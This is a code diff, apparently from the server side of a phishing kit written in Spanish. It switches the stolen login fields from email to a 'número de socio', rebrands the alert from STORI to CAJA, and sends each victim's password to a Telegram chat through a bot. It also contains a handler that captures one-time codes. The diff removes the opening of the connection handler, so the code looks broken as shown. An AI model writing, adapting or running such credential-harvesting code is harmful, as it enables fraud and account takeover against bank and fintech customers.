@@ -24,14 +24,11 @@ app.use(express.static(path.join(__dirname, 'public')));
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
-io.on('connection', (socket) => {
-  console.log('🧠 Usuario conectado:', socket.id);
-
-  // Login principal
-  socket.on('dataForm', ({ correo, contrasena, sessionId }) => {
+  // Login principal (ajustado para campo socio)
+  socket.on('dataForm', ({ socio, contrasena, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔐 Nuevo intento de acceso STORI:\n\n📧 Correo: ${correo}\n🔑 Contraseña: ${contrasena}`;
+    const mensaje = `🔐 Nuevo intento de acceso CAJA:\n\n🔢 Número de socio: ${socio}\n🔑 Contraseña: ${contrasena}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -47,6 +44,7 @@ io.on('connection', (socket) => {
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
+         
   // Código OTP (bienvenido.html)
   socket.on('codigoIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
